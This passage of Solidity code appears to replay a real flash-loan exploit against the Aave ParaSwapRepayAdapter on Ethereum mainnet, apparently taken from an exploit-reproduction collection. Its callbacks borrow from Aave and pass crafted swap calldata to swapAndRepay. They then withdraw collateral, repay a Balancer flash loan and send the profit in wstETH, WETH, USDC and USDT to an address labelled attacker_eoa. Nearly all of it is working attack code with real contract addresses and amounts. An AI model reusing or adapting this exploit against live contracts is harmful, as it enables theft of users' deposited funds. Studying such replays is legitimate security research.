            hex"0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000def171fe48cf0115b1d80b88dc8eab59176fee57000000000000000000000000000000000000000000000000000000000000038454e3f31b0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000142ec35480000000000000000000000000000000000000000000000000000000142ec354800000000000000000000000000000000000000000000000000000000000001e0000000000000000000000000000000000000000000000000000000000000022000000000000000000000000000000000000000000000000000000000000002a0000000000000000000000000000000000000000000000000000000000000030000000000000000000000000002e7b8511831b1b02d9018215a0f8f500ea5c6b300000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003400000000000000000000000000000000000000000000000000000000066cea7970000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e0000000000000000000000000000000000000000000000000000000000000044f3fef3a3000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec70000000000000000000000000000000000000000000000000000000142ec35480000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004400000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
        IParaSwapRepayAdapter(Addresses.ParaSwapRepayAdapter)
            .swapAndRepay(
                Addresses.WETH,
                Addresses.USDT,
                repaySwapAmount_5,
                5417743688,
                2,
                0,
                swapAndRepayProof,
                SwapAndRepayPermit({
                    field0: 0,
                    field1: 0,
                    field2: 0,
                    field3: bytes32(hex"0000000000000000000000000000000000000000000000000000000000000000"),
                    field4: bytes32(hex"0000000000000000000000000000000000000000000000000000000000000000")
                })
            );
    }

    function flashCallback52() internal {
        IERC20Like(Addresses.variableDebtEthUSDT).balanceOf(address(this));
    }

    function flashCallback53() internal {
        IERC20Like(Addresses.WETH).balanceOf(Addresses.ParaSwapRepayAdapter);
    }

    function flashCallback54() internal {
        uint256 repaySwapAmount_6 = 541774368;
        bytes memory swapAndRepayProof =
            hex"0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000def171fe48cf0115b1d80b88dc8eab59176fee57000000000000000000000000000000000000000000000000000000000000042454e3f31b0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec70000000000000000000000000000000000000000000000001757f46417b7963b00000000000000000000000000000000000000000000000000000000204ad22000000000000000000000000000000000000000000000000000000000204ad22000000000000000000000000000000000000000000000000000000000000001e000000000000000000000000000000000000000000000000000000000000002400000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000038000000000000000000000000002e7b8511831b1b02d9018215a0f8f500ea5c6b300000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003e00000000000000000000000000000000000000000000000000000000066cea79700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e0000000000000000000000000000000000000000000000000000000000000088a9059cbb00000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e0000000000000000000000000000000000000000000000001757f46417b7963bf3fef3a3000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec700000000000000000000000000000000000000000000000000000000204ad2200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000440000000000000000000000000000000000000000000000000000000000000088000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
        IParaSwapRepayAdapter(Addresses.ParaSwapRepayAdapter)
            .swapAndRepay(
                Addresses.WBTC,
                Addresses.USDT,
                1,
                repaySwapAmount_6,
                2,
                0,
                swapAndRepayProof,
                SwapAndRepayPermit({
                    field0: 0,
                    field1: 0,
                    field2: 0,
                    field3: bytes32(hex"0000000000000000000000000000000000000000000000000000000000000000"),
                    field4: bytes32(hex"0000000000000000000000000000000000000000000000000000000000000000")
                })
            );
    }

    function flashCallback55() internal {
        IAavePool(Addresses.AavePool).withdraw(Addresses.WETH, type(uint256).max, address(this));
    }

    function flashCallback56() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.ParaSwapRepayAdapter);
    }

    function flashCallback57() internal {
        IAavePool(Addresses.AavePool).getReserveData(Addresses.USDT);
    }

    function flashCallback58() internal {
        IAavePool(Addresses.AavePool).getReserveData(Addresses.USDC);
    }

    function flashCallback59() internal {
        IUSDT(Addresses.USDT).decimals();
    }

    function flashCallback60() internal {
        IUSDC(Addresses.USDC).decimals();
    }

    function flashCallback61() internal {
        IAaveOracle(Addresses.AaveOracle).getAssetPrice(Addresses.USDT);
    }

    function flashCallback62() internal {
        IAaveOracle(Addresses.AaveOracle).getAssetPrice(Addresses.USDC);
    }

    function flashCallback63() internal {
        IERC20Like(Addresses.USDT).approve(Addresses.AavePool, 10390430638);
    }

    function flashCallback64() internal {
        {
            uint256 supplyAmount_5 = 10390430638;
            IAavePool(Addresses.AavePool).supply(Addresses.USDT, supplyAmount_5, address(this), uint16(0));
        }
    }

    function flashCallback65() internal {
        IAavePool(Addresses.AavePool).borrow(Addresses.USDC, 7430668349, 2, uint16(0), address(this));
        IERC20Like(Addresses.aEthUSDT).balanceOf(address(this));
    }

    function flashCallback66() internal {
        {
            uint256 approvalAmount_6 = 10390430638;
            IERC20Like(Addresses.aEthUSDT).approve(Addresses.ParaSwapRepayAdapter, approvalAmount_6);
        }
    }

    function flashCallback67() internal {
        uint256 repaySwapAmount_7 = 5195215319;
        bytes memory swapAndRepayProof =
            hex"0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000def171fe48cf0115b1d80b88dc8eab59176fee57000000000000000000000000000000000000000000000000000000000000038454e3f31b0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000192a374950000000000000000000000000000000000000000000000000000000192a3749500000000000000000000000000000000000000000000000000000000000001e0000000000000000000000000000000000000000000000000000000000000022000000000000000000000000000000000000000000000000000000000000002a0000000000000000000000000000000000000000000000000000000000000030000000000000000000000000002e7b8511831b1b02d9018215a0f8f500ea5c6b300000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003400000000000000000000000000000000000000000000000000000000066cea7970000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e0000000000000000000000000000000000000000000000000000000000000044f3fef3a3000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000000000000000000000000000000000000192a374950000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004400000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
        IParaSwapRepayAdapter(Addresses.ParaSwapRepayAdapter)
            .swapAndRepay(
                Addresses.USDT,
                Addresses.USDC,
                repaySwapAmount_7,
                6755153045,
                2,
                0,
                swapAndRepayProof,
                SwapAndRepayPermit({
                    field0: 0,
                    field1: 0,
                    field2: 0,
                    field3: bytes32(hex"0000000000000000000000000000000000000000000000000000000000000000"),
                    field4: bytes32(hex"0000000000000000000000000000000000000000000000000000000000000000")
                })
            );
        IERC20Like(Addresses.variableDebtEthUSDC).balanceOf(address(this));
    }

    function flashCallback68() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.ParaSwapRepayAdapter);
    }

    function flashCallback69() internal {
        uint256 repaySwapAmount_8 = 675515304;
        bytes memory swapAndRepayProof =
            hex"0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000def171fe48cf0115b1d80b88dc8eab59176fee57000000000000000000000000000000000000000000000000000000000000042454e3f31b0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000000000000000000000000000000000000135a8b1d70000000000000000000000000000000000000000000000000000000028438ba80000000000000000000000000000000000000000000000000000000028438ba800000000000000000000000000000000000000000000000000000000000001e000000000000000000000000000000000000000000000000000000000000002400000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000038000000000000000000000000002e7b8511831b1b02d9018215a0f8f500ea5c6b300000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003e00000000000000000000000000000000000000000000000000000000066cea79700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec700000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e0000000000000000000000000000000000000000000000000000000000000088a9059cbb00000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e0000000000000000000000000000000000000000000000000000000135a8b1d7f3fef3a3000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000000000000000000000000000000000000028438ba80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000440000000000000000000000000000000000000000000000000000000000000088000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
        IParaSwapRepayAdapter(Addresses.ParaSwapRepayAdapter)
            .swapAndRepay(
                Addresses.WBTC,
                Addresses.USDC,
                1,
                repaySwapAmount_8,
                2,
                0,
                swapAndRepayProof,
                SwapAndRepayPermit({
                    field0: 0,
                    field1: 0,
                    field2: 0,
                    field3: bytes32(hex"0000000000000000000000000000000000000000000000000000000000000000"),
                    field4: bytes32(hex"0000000000000000000000000000000000000000000000000000000000000000")
                })
            );
    }

    function flashCallback70() internal {
        IAavePool(Addresses.AavePool).withdraw(Addresses.USDT, type(uint256).max, address(this));
    }

    function flashCallback71() internal {
        IAavePool(Addresses.AavePool).withdraw(Addresses.WBTC, type(uint256).max, address(this));
    }

    function flashCallback72() internal {
        IERC20Like(Addresses.WBTC).balanceOf(address(this));
    }

    function flashCallback73() internal {
        {
            uint256 transferAmount = 2927281132;
            IERC20Like(Addresses.WBTC).transfer(Addresses.BalancerVault, transferAmount);
        }
    }

    function flashCallback74() internal {
        IERC20Like(Addresses.wstETH).balanceOf(address(this));
    }

    function flashCallback75() internal {
        {
            uint256 transferAmount_2 = 16336972267453390147143;
            IERC20Like(Addresses.wstETH).transfer(Addresses.BalancerVault, transferAmount_2);
        }
    }

    function flashCallback76() internal {
        {
            uint256 transferAmount_3 = 425966524925658359;
            IERC20Like(Addresses.wstETH).transfer(Addresses.attacker_eoa, transferAmount_3);
        }
    }

    function flashCallback77() internal {
        IERC20Like(Addresses.USDC).balanceOf(address(this));
    }

    function flashCallback78() internal {
        {
            uint256 transferAmount_4 = 11573873146840;
            IERC20Like(Addresses.USDC).transfer(Addresses.BalancerVault, transferAmount_4);
        }
    }

    function flashCallback79() internal {
        {
            uint256 profitTransferAmount = 21426349775;
            IERC20Like(Addresses.USDC).transfer(Addresses.attacker_eoa, profitTransferAmount);
        }
    }

    function flashCallback80() internal {
        IERC20Like(Addresses.WETH).balanceOf(address(this));
    }

    function flashCallback81() internal {
        {
            uint256 transferAmount_5 = 36127285859155078535656;
            IERC20Like(Addresses.WETH).transfer(Addresses.BalancerVault, transferAmount_5);
        }
    }

    function flashCallback82() internal {
        {
            uint256 transferAmount_6 = 1682081696577984059;
            IERC20Like(Addresses.WETH).transfer(Addresses.attacker_eoa, transferAmount_6);
        }
    }

    function flashCallback83() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function flashCallback84() internal {
        {
            uint256 transferAmount_7 = 3501240142017;
            IERC20Like(Addresses.USDT).transfer(Addresses.BalancerVault, transferAmount_7);
        }
    }

    function flashCallback85() internal {
        {
            uint256 transferAmount_8 = 5195215319;
            IERC20Like(Addresses.USDT).transfer(Addresses.attacker_eoa, transferAmount_8);
        }
    }

    function _handleCallback() internal {
        replayedCallback4 = true;
        _settleTokenFlows();
    }

    function _settleTokenFlows() internal {
        IERC20Like(Addresses.USDC).transfer(Addresses.AugustusSwapper, 6755153045);
    }

    function _handleCallback2() internal {
        replayedCallback5 = true;
        _settleTokenFlows2();
    }

    function _settleTokenFlows2() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.AugustusSwapper, 27848592724);
    }

    function _handleCallback3() internal {
        replayedCallback6 = true;
        _settleTokenFlows3();
    }

    function _settleTokenFlows3() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.AugustusSwapper, 2784859272);
    }

    function _handleCallback4() internal {
        replayedCallback7 = true;
        _settleTokenFlows4();
    }

    function _settleTokenFlows4() internal {
        IERC20Like(Addresses.USDC).transfer(Addresses.AugustusSwapper, 675515304);
    }

    function _handleCallback5() internal {
        replayedCallback8 = true;
        _settleTokenFlows5();
    }

    function _settleTokenFlows5() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.AugustusSwapper, 1614956164);
    }

    function _handleCallback6() internal {
        replayedCallback9 = true;
        _settleTokenFlows6();
    }

    function _settleTokenFlows6() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.AugustusSwapper, 541774368);
    }

    function _handleCallback7() internal {
        replayedCallback10 = true;
        _settleTokenFlows7();
    }

    function _settleTokenFlows7() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.AugustusSwapper, 161495616);
    }

    function _handleCallback8() internal {
        replayedCallback11 = true;
        _settleTokenFlows8();
    }

    function _settleTokenFlows8() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.AugustusSwapper, 5417743688);
    }

    function _handleFlashLoanCall() public {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant ParaSwapRepayAdapter = 0x02e7B8511831B1b02d9018215a0f8f500Ea5c6B3;
    address internal constant aEthwstETH = 0x0B925eD163218f6662a35e0f0371Ac234f9E9371;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_102633 =
        0x102633152313C81cD80419b6EcF66d14Ad68949A;
    address internal constant STABLE_DEBT_TOKEN_IMPL = 0x15C5620dfFaC7c7366EED66C20Ad222DDbB1eD57;
    address internal constant TokenTransferProxy = 0x216B4B4Ba9F3e719726886d34a177484278Bfcae;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant aEthUSDT = 0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_397399 =
        0x39739943199c0fBFe9E5f1B5B160cd73a64CB85D;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_40AABE =
        0x40aAbEf1aa8f0eEc637E0E7d92fbfFB2F26A8b7B;
    address internal constant A_435068_02DD = 0x43506849D7C04F9138D1A2050bbF3A0c054402dd;
    address internal constant aEthWETH = 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8;
    address internal constant AaveOracle = 0x54586bE62E3c3580375aE3723C145253060Ca0C2;
    address internal constant attack_contract = 0x5e2FFf7bBc7c634992170fF18240b8f10c4D48C6;
    address internal constant aEthWBTC = 0x5Ee5bf7ae06D1Be5997A1A72006FE6C607eC6DE8;
    address internal constant variableDebtEthUSDT = 0x6df1C1E379bC5a00a7b4C6e67A203333772f45A8;
    address internal constant attacker_eoa = 0x6ea83f23795F55434C38bA67FCc428aec0C296DC;
    address internal constant variableDebtEthUSDC = 0x72E95b8931767C79bA4EeE721354d6E99a61D004;
    address internal constant attack_child = 0x78B0168a18eF61D7460FAbb4795e5f1A9226583E;
    address internal constant ATOKEN_IMPL = 0x7EfFD7b47Bfd17e52fB7559d3f924201b9DbfF3d;
    address internal constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address internal constant stableDebtEthUSDT = 0x822Fa72Df1F229C3900f5AD6C3Fa2C424D691622;
    address internal constant DefaultReserveInterestRateStrategyV2 = 0x847A3364Cc5fE389283bD821cfC8A477288D9e82;
    address internal constant AavePool = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address internal constant aEthUSDC = 0x98C23E9d8f34FEFb1B7BD6a91B7FF122F4e16F5c;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_A1773F =
        0xA1773F1ccF6DB192Ad8FE826D15fe1d328B03284;
    address internal constant VARIABLE_DEBT_TOKEN_IMPL = 0xaC725CB59D16C81061BDeA61041a8A5e73DA9EC6;
    address internal constant stableDebtEthUSDC = 0xB0fe3D292f4bd50De902Ba5bDF120Ad66E9d7a39;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_C96113 =
        0xC96113eED8cAB59cD8A66813bCB0cEb29F06D2e4;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant AugustusSwapper = 0xDEF171Fe48CF0115B1d80b88dc8eAB59176FEe57;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_EA51D7 =
        0xeA51d7853EEFb32b6ee06b1C12E6dcCA88Be0fFE;
    address internal constant FeeClaimer = 0xeF13101C5bbD737cFb2bF00Bbd38c626AD6952F7;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

struct SwapAndRepayPermit {
    uint256 field0;
    uint256 field1;
    uint8 field2;
    bytes32 field3;
    bytes32 field4;
}

interface IAaveOracle {
    function getAssetPrice(address) external view returns (uint256);
}

interface IAavePool {
    function borrow(address, uint256, uint256, uint16, address) external;
    function getReserveData(address) external view;
    function setUserUseReserveAsCollateral(address, bool) external;
    function supply(address, uint256, address, uint16) external;
    function withdraw(address, uint256, address) external returns (uint256);
}

interface IParaSwapRepayAdapter {
    function ORACLE() external view returns (uint256);
    function POOL() external view returns (uint256);
    function swapAndRepay(
        address,
        address,
        uint256,
        uint256,
        uint256,
        uint256,
        bytes calldata,
        SwapAndRepayPermit calldata
    ) external;
}

interface IUSDC {
    function decimals() external view returns (uint256);
}

interface IUSDT {
    function decimals() external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(address, address[] calldata, uint256[] calldata, bytes calldata) external;
}

interface IWETH {
    function decimals() external view returns (uint256);
}

interface IAttackChild {
    function run() external;
}

interface IwstETH {
    function decimals() external view returns (uint256);
}

library Harness {
    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
